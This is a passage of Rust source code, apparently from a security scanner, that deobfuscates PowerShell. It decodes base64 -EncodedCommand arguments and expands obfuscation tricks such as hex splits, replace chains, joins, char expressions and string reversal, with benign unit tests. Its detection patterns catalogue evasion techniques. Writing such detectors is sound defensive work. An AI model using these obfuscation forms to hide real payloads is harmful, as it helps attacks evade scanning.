            return pos;
        };
        if !ch.is_whitespace() {
            break;
        }
        pos += ch.len_utf8();
    }

    if text.as_bytes().get(pos) == Some(&b'@') {
        let mut next = pos + 1;
        while next < text.len() {
            let Some(ch) = text[next..].chars().next() else {
                return pos;
            };
            if !ch.is_whitespace() {
                break;
            }
            next += ch.len_utf8();
        }
        if text.as_bytes().get(next) == Some(&b'(') {
            return next + 1;
        }
    }
    if text.as_bytes().get(pos) == Some(&b'(') {
        return pos + 1;
    }

    pos
}

fn decode_start_process_encoded_argument(argument: &str) -> Option<String> {
    let tokens = crate::handlers::util::split_words(argument);
    let mut i = 0usize;
    while i < tokens.len() {
        let token = crate::handlers::util::strip_outer_quotes(&tokens[i]);
        if let Some((flag, value)) = attached_ps_flag_value_for_scan(token) {
            if flag == "EncodedCommand" {
                return decode_powershell_encoded_command_for_scan(value);
            }
        }
        if crate::handlers::powershell::canonical_ps_flag(token) == Some("EncodedCommand") {
            let encoded = collect_base64_argument(&tokens[i + 1..]);
            if let Some(decoded) = decode_powershell_encoded_command_for_scan(&encoded) {
                return Some(decoded);
            }
        }
        i += 1;
    }
    None
}

fn attached_ps_flag_value_for_scan(token: &str) -> Option<(&'static str, &str)> {
    let stripped = token
        .strip_prefix('/')
        .or_else(|| token.strip_prefix('-'))?;
    let delimiter = stripped.find([':', '='])?;
    let flag = crate::handlers::powershell::canonical_ps_flag(
        &token[..token.len() - stripped.len() + delimiter],
    )?;
    let value = &stripped[delimiter + 1..];
    if value.is_empty() {
        return None;
    }
    Some((flag, value))
}

fn collect_base64_argument(tokens: &[String]) -> String {
    let mut out = String::new();
    for token in tokens {
        let token = crate::handlers::util::strip_outer_quotes(token);
        if token.is_empty() || !token.chars().all(is_base64_char) {
            break;
        }
        out.push_str(token);
    }
    out
}

fn is_base64_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '=')
}

fn decode_powershell_encoded_command_for_scan(encoded: &str) -> Option<String> {
    if encoded.len() < 16 || !encoded.chars().all(is_base64_char) {
        return None;
    }
    let decoded = base64::engine::general_purpose::STANDARD
        .decode(encoded)
        .ok()?;
    let decoded = decode_payload(&decoded).into_owned();
    looks_like_powershell_payload(decoded.as_bytes()).then_some(decoded)
}

fn start_process_argument_list_flag_len_at(lower: &str, pos: usize) -> Option<usize> {
    const FLAGS: &[&str] = &[
        "-argumentlist",
        "-arguments",
        "-argument",
        "-args",
        "-arg",
        "-a",
    ];
    FLAGS.iter().find_map(|flag| {
        let end = pos.checked_add(flag.len())?;
        let rest = lower.get(pos..end)?;
        if rest != *flag {
            return None;
        }
        let next = lower.as_bytes().get(end).copied();
        if matches!(next, Some(b) if b.is_ascii_alphanumeric() || b == b'-') {
            return None;
        }
        Some(flag.len())
    })
}

#[cfg(test)]
mod start_process_argument_list_prefilter_tests {
    use super::{
        expand_start_process_argument_list, parse_ps_quoted_argument,
        parse_ps_single_quoted_literal,
    };

    #[test]
    fn ignores_text_without_argument_list_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_start_process_argument_list(text), text);
    }

    #[test]
    fn parse_ps_quoted_argument_handles_ascii_boundary_cases() {
        assert_eq!(
            parse_ps_quoted_argument("   'ab''c'", 0),
            Some(("ab'c".to_string(), 10))
        );
        assert_eq!(
            parse_ps_quoted_argument("  \"a``b\"", 0),
            Some(("a`b".to_string(), 8))
        );
        assert_eq!(
            parse_ps_quoted_argument("  \"héllo\"", 0),
            Some(("héllo".to_string(), 10))
        );
        assert_eq!(
            parse_ps_quoted_argument("  \"a`héllo\"", 0),
            Some(("ahéllo".to_string(), 12))
        );
        assert_eq!(parse_ps_quoted_argument("no quote", 0), None);
    }

    #[test]
    fn parse_ps_single_quoted_literal_handles_ascii_boundary_cases() {
        assert_eq!(
            parse_ps_single_quoted_literal("'ab''c'", 0),
            Some((7, "ab'c".to_string()))
        );
        assert_eq!(
            parse_ps_single_quoted_literal("'a`b'", 0),
            Some((5, "a`b".to_string()))
        );
        assert_eq!(
            parse_ps_single_quoted_literal("'héllo'", 0),
            Some((8, "héllo".to_string()))
        );
        assert_eq!(parse_ps_single_quoted_literal("no quote", 0), None);
    }
}

fn parse_ps_quoted_argument(text: &str, start: usize) -> Option<(String, usize)> {
    let bytes = text.as_bytes();
    let mut pos = start;
    while bytes.get(pos).is_some_and(|b| b.is_ascii_whitespace()) {
        pos += 1;
    }
    let &quote = bytes.get(pos)?;
    if quote != b'\'' && quote != b'"' {
        return None;
    }
    pos += 1;
    let mut out = String::new();
    while pos < bytes.len() {
        let byte = bytes[pos];
        if byte.is_ascii() && byte != quote && byte != b'`' {
            out.push(byte as char);
            pos += 1;
            continue;
        }
        let (ch, ch_len) = next_char_at(text, pos)?;
        pos += ch_len;
        if ch == quote as char {
            if quote == b'\'' && bytes.get(pos) == Some(&b'\'') {
                out.push('\'');
                pos += 1;
                continue;
            }
            return Some((out, pos));
        }
        if quote == b'"' && ch == '`' {
            if let Some(&next_byte) = bytes.get(pos) {
                if next_byte.is_ascii() {
                    out.push(next_byte as char);
                    pos += 1;
                    continue;
                }
                if let Some((next, next_len)) = text[pos..]
                    .chars()
                    .next()
                    .map(|next| (next, next.len_utf8()))
                {
                    out.push(next);
                    pos += next_len;
                    continue;
                }
            }
        }
        out.push(ch);
    }
    None
}

#[allow(clippy::expect_used)]
static HEX_SPLIT_CHAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)'((?:[0-9a-f]{2}\s+){3,}[0-9a-f]{2})'\s*-Split\s*['"][^'"]*['"]\s*(?:\|\s*)?foreach(?:-object)?\s*\{[^{}]*?toint16\s*\(\s*\$_\s*,\s*16\s*\)[^{}]*?\}"#,
    )
    .expect("hex split char loop")
});

fn expand_hex_split_char_loop(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-split")
        || !contains_ascii_case_insensitive(text, "toint16")
    {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = HEX_SPLIT_CHAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let hex = caps.get(1)?.as_str();
            let bytes: Vec<u8> = hex
                .split_whitespace()
                .filter_map(|part| u8::from_str_radix(part, 16).ok())
                .collect();
            if bytes.is_empty() {
                return None;
            }
            let decoded = String::from_utf8_lossy(&bytes).into_owned();
            Some((full.start(), full.end(), format!("'{}'", decoded)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod hex_split_char_prefilter_tests {
    use super::expand_hex_split_char_loop;

    #[test]
    fn ignores_text_without_hex_split_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_hex_split_char_loop(text), text);
    }
}

#[allow(clippy::expect_used)]
static GETSTRING_UNWRAP_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(?:UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*'([^']*)'\s*\)"
    ).expect("getstring unwrap")
});

fn expand_getstring_wrapper(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "getstring(") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = GETSTRING_UNWRAP_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let inner = caps.get(1)?.as_str();
            Some((full.start(), full.end(), format!("'{}'", inner)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod getstring_wrapper_prefilter_tests {
    use super::expand_getstring_wrapper;

    #[test]
    fn ignores_text_without_getstring_wrapper_shape() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_getstring_wrapper(text), text);
    }
}

#[allow(clippy::expect_used)]
static REPLACE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)(?:'((?:''|[^'])*)'|"([^"]*)")\s*-(i?replace)\s*(?:'((?:''|[^'])*)'|"([^"]*)")\s*,\s*(?:'((?:''|[^'])*)'|"([^"]*)")"#)
        .expect("replace")
});

fn expand_ps_replace(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-replace")
        && !contains_ascii_case_insensitive(text, "-ireplace")
    {
        return text.to_string();
    }
    let mut out = text.to_string();
    // Run repeatedly so chained -replace ('a' -replace 'x','y' -replace 'z','w') works.
    loop {
        let mut hit = false;
        let next: Vec<(usize, usize, String)> = REPLACE_RE
            .captures_iter(&out)
            .filter_map(|caps| {
                let full = caps.get(0)?;
                let haystack = ps_capture_string(&caps, 1, 2)?;
                let operator = caps.get(3)?.as_str();
                let needle = ps_capture_string(&caps, 4, 5)?;
                let repl = ps_capture_string(&caps, 6, 7)?;
                if needle.is_empty() {
                    return None;
                }
                let new_str = if operator.eq_ignore_ascii_case("ireplace") {
                    replace_ascii_case_insensitive(&haystack, &needle, &repl)
                } else {
                    haystack.replace(&needle, &repl)
                };
                Some((full.start(), full.end(), format!("'{}'", new_str)))
            })
            .collect();
        if next.is_empty() {
            break;
        }
        for (start, end, replacement) in next.into_iter().rev() {
            out.replace_range(start..end, &replacement);
            hit = true;
        }
        if !hit {
            break;
        }
    }
    out
}

#[cfg(test)]
mod ps_replace_prefilter_tests {
    use super::expand_ps_replace;

    #[test]
    fn ignores_text_without_replace_operator() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_ps_replace(text), text);
    }

    #[test]
    fn ignores_empty_replace_pattern() {
        let text = "'abc' -replace '', 'X'";
        assert_eq!(expand_ps_replace(text), text);
    }
}

fn expand_ps_dot_replace(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, ".replace(") {
        return text.to_string();
    }
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut start = 0;
    while let Some((literal_start, literal_end, haystack)) = next_ps_quoted_literal(text, start) {
        let replacement_start = previous_non_whitespace_ascii_pos(text, literal_start)
            .filter(|pos| bytes.get(*pos) == Some(&b'('))
            .unwrap_or(literal_start);
        let mut pos = skip_ascii_ws(bytes, literal_end);
        if replacement_start < literal_start && bytes.get(pos) == Some(&b')') {
            pos = skip_ascii_ws(bytes, pos + 1);
        }
        if bytes.get(pos) != Some(&b'.') {
            start = literal_end;
            continue;
        }
        pos += 1;
        let Some(after_dot) = text.get(pos..) else {
            start = literal_end;
            continue;
        };
        let Some(method) = after_dot.get(.."Replace".len()) else {
            start = literal_end;
            continue;
        };
        if !method.eq_ignore_ascii_case("Replace") {
            start = literal_end;
            continue;
        }
        pos += "Replace".len();
        pos = skip_ascii_ws(bytes, pos);
        if bytes.get(pos) != Some(&b'(') {
            start = literal_end;
            continue;
        }
        pos = skip_ascii_ws(bytes, pos + 1);
        let Some((needle_end, needle)) = parse_ps_replace_arg(text, pos) else {
            start = literal_end;
            continue;
        };
        pos = skip_ascii_ws(bytes, needle_end);
        if bytes.get(pos) != Some(&b',') {
            start = literal_end;
            continue;
        }
        pos = skip_ascii_ws(bytes, pos + 1);
        let Some((repl_end, repl)) = parse_ps_replace_arg(text, pos) else {
            start = literal_end;
            continue;
        };
        pos = skip_ascii_ws(bytes, repl_end);
        if bytes.get(pos) != Some(&b')') {
            start = literal_end;
            continue;
        }
        if needle.is_empty() {
            start = pos + 1;
            continue;
        }
        let replaced = haystack.replace(&needle, &repl);
        matches.push((
            replacement_start,
            pos + 1,
            format!("'{}'", replaced.replace('\'', "''")),
        ));
        start = pos + 1;
    }

    let mut out = text.to_string();
    for (start_pos, end_pos, replacement) in matches.into_iter().rev() {
        out.replace_range(start_pos..end_pos, &replacement);
    }
    out
}

fn previous_non_whitespace_ascii_pos(text: &str, pos: usize) -> Option<usize> {
    let bytes = text.as_bytes();
    let mut idx = pos.min(bytes.len());
    while idx > 0 {
        idx -= 1;
        if bytes[idx].is_ascii_whitespace() {
            continue;
        }
        return Some(idx);
    }
    None
}

fn parse_ps_replace_arg(text: &str, start: usize) -> Option<(usize, String)> {
    let start = skip_ascii_ws(text.as_bytes(), start);
    if let Some((end, value)) = parse_ps_quoted_literal(text, start) {
        return Some((end, value));
    }

    let bytes = text.as_bytes();
    let mut end = start;
    let mut depth = 0usize;
    while end < text.len() {
        match bytes[end] {
            b'(' => {
                depth += 1;
                end += 1;
            }
            b')' if depth > 0 => {
                depth -= 1;
                end += 1;
            }
            b',' | b')' if depth == 0 => break,
            _ => end += 1,
        }
    }
    if end <= start {
        return None;
    }
    let expr = text[start..end].trim();
    let expr = expr
        .strip_prefix('(')
        .and_then(|value| value.strip_suffix(')'))
        .unwrap_or(expr)
        .trim();
    let value = eval_ps_char_expression(expr)?;
    Some((end, value))
}

fn eval_ps_char_expression(expr: &str) -> Option<String> {
    if !contains_ascii_case_insensitive(expr, "[char]") {
        return None;
    }
    let mut out = String::new();
    for cap in CHAR_INNER_RE.captures_iter(expr) {
        let codepoint = parse_ps_char_codepoint(cap.get(1)?.as_str())?;
        out.push(char::from_u32(codepoint)?);
    }
    (!out.is_empty()).then_some(out)
}

#[cfg(test)]
mod ps_dot_replace_prefilter_tests {
    use super::expand_ps_dot_replace;

    #[test]
    fn ignores_text_without_dot_replace_shape() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_ps_dot_replace(text), text);
    }

    #[test]
    fn ignores_empty_dot_replace_pattern() {
        let text = "'abc'.Replace('', 'X')";
        assert_eq!(expand_ps_dot_replace(text), text);
    }

    #[test]
    fn expands_dot_replace_char_expression_args() {
        let text = "'A8LUB'.Replace(([CHAR]56+[CHAR]76+[CHAR]85),[string][char]39)";
        assert_eq!(expand_ps_dot_replace(text), "'A''B'");
    }

    #[test]
    fn expands_parenthesized_dot_replace_char_expression_args() {
        let text = "('A8LUB').Replace(([CHAR]56+[CHAR]76+[CHAR]85),[string][char]39)";
        assert_eq!(expand_ps_dot_replace(text), "'A''B'");
    }
}

#[allow(clippy::expect_used)]
static JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    // (?:'a',"b",'c') -join 'sep' or @('a',"b",'c') -join "sep".
    // Outer parens are optional for the bare array form.
    Regex::new(r#"@?\(?\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)+(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)?\s*-join\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")"#)
        .expect("join")
});

#[allow(clippy::expect_used)]
static UNARY_LITERAL_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"-join\s+@?\(\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)+(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)"#)
        .expect("unary literal join")
});

#[allow(clippy::expect_used)]
static JOIN_PART_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)""#).expect("join part")
});

#[allow(clippy::expect_used)]
static STRING_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?String\]::Join\s*\(\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*,\s*@?\(\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)*(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)\s*\)"#,
    )
    .expect("string join")
});

#[allow(clippy::expect_used)]
static STRING_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?String\]::Concat\s*\(\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)*(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)"#,
    )
    .expect("string concat")
});

#[allow(clippy::expect_used)]
static SINGLE_LITERAL_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\(\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*-join\s*(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*\)|(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*-join\s*(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")"#,
    )
    .expect("single literal join")
});

#[allow(clippy::expect_used)]
static SPLIT_JOIN_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\(\s*\(?\s*(?:'((?:''|[^'])*)'|"([^"]*)")\s*-i?split\s*(?:'((?:''|[^'])*)'|"([^"]*)")\s*\)?\s*-join\s*(?:'((?:''|[^'])*)'|"([^"]*)")\s*\)"#,
    )
    .expect("split join literal")
});

#[allow(clippy::expect_used)]
static LITERAL_SUBSTRING_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:'((?:''|[^'])*)'|"([^"]*)")\s*\.\s*Substring\s*\(\s*(\d+)\s*(?:,\s*(\d+)\s*)?\)"#,
    )
    .expect("literal substring")
});

fn expand_ps_split_join_literals(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "split")
        || !contains_ascii_case_insensitive(text, "-join")
    {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = SPLIT_JOIN_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let haystack = ps_capture_string(&caps, 1, 2)?;
            let split = normalize_simple_ps_split_separator(&ps_capture_string(&caps, 3, 4)?);
            let join = ps_capture_string(&caps, 5, 6)?;
            if split.is_empty() {
                return None;
            }
            Some((
                full.start(),
                full.end(),
                format!(
                    "'{}'",
                    haystack.split(&split).collect::<Vec<_>>().join(&join)
                ),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_ps_literal_substring(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, ".substring(") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = LITERAL_SUBSTRING_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let value = ps_capture_string(&caps, 1, 2)?;
            let start: usize = caps.get(3)?.as_str().parse().ok()?;
            let chars: Vec<char> = value.chars().collect();
            if start > chars.len() {
                return None;
            }
            let end = if let Some(len) = caps.get(4) {
                start.saturating_add(len.as_str().parse::<usize>().ok()?)
            } else {
                chars.len()
            };
            if end > chars.len() {
                return None;
            }
            let substring: String = chars[start..end].iter().collect();
            Some((
                full.start(),
                full.end(),
                format!("'{}'", substring.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_single_literal_join(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-join") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = SINGLE_LITERAL_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            if previous_non_whitespace_ascii_byte(text, full.start()) == Some(b',') {
                return None;
            }
            let value = caps
                .get(1)
                .or_else(|| caps.get(2))
                .or_else(|| caps.get(3))
                .or_else(|| caps.get(4))?
                .as_str();
            Some((full.start(), full.end(), format!("'{}'", value)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod single_literal_join_prefilter_tests {
    use super::{
        expand_reverse_string_slice_join, expand_single_literal_join,
        expand_tochararray_reverse_join, previous_non_whitespace_ascii_byte,
    };

    #[test]
    fn ignores_text_without_join_operator() {
        let text = "Write-Host hello world";
        assert_eq!(expand_single_literal_join(text), text);
        assert_eq!(expand_reverse_string_slice_join(text), text);
    }

    #[test]
    fn previous_non_whitespace_ascii_byte_handles_ascii_whitespace() {
        assert_eq!(previous_non_whitespace_ascii_byte("ab , \t", 6), Some(b','));
        assert_eq!(previous_non_whitespace_ascii_byte("   ", 3), None);
    }

    #[test]
    fn reverse_join_helpers_handle_ascii_and_unicode_literals() {
        let ascii = "'abcd'[-1..-2]-join''";
        assert_eq!(expand_reverse_string_slice_join(ascii), "'dc'");

        let unicode = "'héllo'[-1..-3]-join''";
        assert_eq!(expand_reverse_string_slice_join(unicode), "'oll'");

        let tochar = "$x='abcd';$y=$x.ToCharArray();[array]::Reverse($y);$z=-join($y)";
        assert_eq!(
            expand_tochararray_reverse_join(tochar),
            "$x='abcd';$y=$x.ToCharArray();[array]::Reverse($y);$z='dcba'"
        );
    }
}

#[allow(clippy::expect_used)]
static REVERSE_STRING_SLICE_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\(\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*\[\s*-1\s*\.\.\s*-(\d+)\s*\]\s*-join\s*(?:''|"")\s*\)|(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*\[\s*-1\s*\.\.\s*-(\d+)\s*\]\s*-join\s*(?:''|"")"#,
    )
    .expect("reverse string slice join")
});

fn expand_reverse_string_slice_join(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-join") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = REVERSE_STRING_SLICE_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let value = caps
                .get(1)
                .or_else(|| caps.get(2))
                .or_else(|| caps.get(4))
                .or_else(|| caps.get(5))?
                .as_str();
            let requested_len: usize =
                caps.get(3).or_else(|| caps.get(6))?.as_str().parse().ok()?;
            let reversed = reverse_literal_prefix(value, requested_len)?;
            Some((full.start(), full.end(), format!("'{}'", reversed)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static TOCHARARRAY_REVERSE_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?:'([^']*)'|"([^"]*)")\s*;\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\.ToCharArray\s*\(\s*\)\s*;\s*\[array\]::Reverse\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*;\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*-join\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
    )
    .expect("tochararray reverse join")
});

#[allow(clippy::expect_used)]
static LITERAL_TOCHARARRAY_REVERSE_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$[A-Za-z_][A-Za-z0-9_]*\s*=\s*(?:'([^']*)'|"([^"]*)")\s*;.{0,300}?\$[A-Za-z_][A-Za-z0-9_]*\s*=\s*(?:'([^']*)'|"([^"]*)")\s*\.ToCharArray\s*\(\s*\)\s*;.{0,200}?\[array\]::Reverse\s*\(\s*(?:'([^']*)'|"([^"]*)")\s*\)\s*;.{0,200}?(\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*-join\s*\(\s*(?:'([^']*)'|"([^"]*)")\s*\))"#,
    )
    .expect("literal tochararray reverse join")
});

fn expand_tochararray_reverse_join(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "tochararray")
        || !contains_ascii_case_insensitive(text, "reverse")
        || !contains_ascii_case_insensitive(text, "-join")
    {
        return text.to_string();
    }
    let mut matches: Vec<(usize, usize, String)> = TOCHARARRAY_REVERSE_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let src_var = caps.get(1)?.as_str();
            let value = caps.get(2).or_else(|| caps.get(3))?.as_str();
            let arr_var = caps.get(4)?.as_str();
            let src_ref = caps.get(5)?.as_str();
            let reverse_ref = caps.get(6)?.as_str();
            let dst_var = caps.get(7)?.as_str();
            let join_ref = caps.get(8)?.as_str();
            if src_ref != src_var || reverse_ref != arr_var || join_ref != arr_var {
                return None;
            }
            let reversed = reverse_literal_value(value);
            let replacement = format!(
                "${src_var}='{value}';${arr_var}=${src_var}.ToCharArray();[array]::Reverse(${arr_var});${dst_var}='{reversed}'"
            );
            Some((full.start(), full.end(), replacement))
        })
        .collect();
    matches.extend(
        LITERAL_TOCHARARRAY_REVERSE_JOIN_RE
            .captures_iter(text)
            .filter_map(|caps| {
                let value = caps.get(1).or_else(|| caps.get(2))?.as_str();
                let arr_value = caps.get(3).or_else(|| caps.get(4))?.as_str();
                let reverse_value = caps.get(5).or_else(|| caps.get(6))?.as_str();
                let final_assignment = caps.get(7)?;
                let dst_var = caps.get(8)?.as_str();
                let join_value = caps.get(9).or_else(|| caps.get(10))?.as_str();
                if value != arr_value || value != reverse_value || value != join_value {
                    return None;
                }
                let reversed = reverse_literal_value(value);
                Some((
                    final_assignment.start(),
                    final_assignment.end(),
                    format!("${dst_var}='{reversed}'"),
                ))
            }),
    );
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn reverse_literal_value(value: &str) -> String {
    if value.is_ascii() {
        let mut out = String::with_capacity(value.len());
        for &byte in value.as_bytes().iter().rev() {
            out.push(byte as char);
        }
        return out;
    }
    value.chars().rev().collect()
}

fn reverse_literal_prefix(value: &str, requested_len: usize) -> Option<String> {
    if requested_len == 0 {
        return None;
    }
    if value.is_ascii() {
        let bytes = value.as_bytes();
        if requested_len > bytes.len() {
            return None;
        }
        let mut out = String::with_capacity(requested_len);
        for &byte in bytes.iter().rev().take(requested_len) {
            out.push(byte as char);
        }
        return Some(out);
    }
    let chars: Vec<char> = value.chars().collect();
    if requested_len > chars.len() {
        return None;
    }
    Some(chars.iter().rev().take(requested_len).collect())
}

fn previous_non_whitespace_ascii_byte(text: &str, pos: usize) -> Option<u8> {
    let bytes = text.as_bytes();
    let mut idx = pos.min(bytes.len());
    while idx > 0 {
        idx -= 1;
        let byte = bytes[idx];
        if byte.is_ascii_whitespace() {
            continue;
        }
        return Some(byte);
    }
    None
}

fn expand_ps_join(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-join") {
        return text.to_string();
    }
    let mut matches: Vec<(usize, usize, String)> = JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let parts_text = caps.get(1)?.as_str();
            let sep = caps.get(2).or_else(|| caps.get(3))?.as_str();
            let parts: Vec<String> = JOIN_PART_RE
                .captures_iter(parts_text)
                .filter_map(|c| {
                    c.get(1)
                        .or_else(|| c.get(2))
                        .map(|m| m.as_str().to_string())
                })
                .collect();
            if parts.is_empty() {
                return None;
            }
            Some((full.start(), full.end(), format!("'{}'", parts.join(sep))))
        })
        .collect();
    matches.extend(
        UNARY_LITERAL_JOIN_RE
            .captures_iter(text)
            .filter_map(|caps| {
                let full = caps.get(0)?;
                let parts_text = caps.get(1)?.as_str();
                let parts: Vec<String> = JOIN_PART_RE
                    .captures_iter(parts_text)
                    .filter_map(|c| {
                        c.get(1)
                            .or_else(|| c.get(2))
                            .map(|m| m.as_str().to_string())
                    })
                    .collect();
                if parts.is_empty() {
                    return None;
                }
                Some((full.start(), full.end(), format!("'{}'", parts.join(""))))
            }),
    );
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_ps_string_join(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "String]::Join") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = STRING_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let sep = caps.get(1).or_else(|| caps.get(2))?.as_str();
            let parts_text = caps.get(3)?.as_str();
            let parts: Vec<String> = JOIN_PART_RE
                .captures_iter(parts_text)
                .filter_map(|c| {
                    c.get(1)
                        .or_else(|| c.get(2))
                        .map(|m| m.as_str().to_string())
                })
                .collect();
            if parts.is_empty() || parts.len() > 128 || sep.len() > 64 {
                return None;
            }
            let joined = parts.join(sep);
            if joined.len() > 8192 {
                return None;
            }
            Some((
                full.start(),
                full.end(),
                format!("'{}'", joined.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_ps_string_concat_static(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "String]::Concat") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = STRING_CONCAT_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let parts_text = caps.get(1)?.as_str();
            let parts: Vec<String> = JOIN_PART_RE
                .captures_iter(parts_text)
                .filter_map(|c| {
                    c.get(1)
                        .or_else(|| c.get(2))
                        .map(|m| m.as_str().to_string())
                })
                .collect();
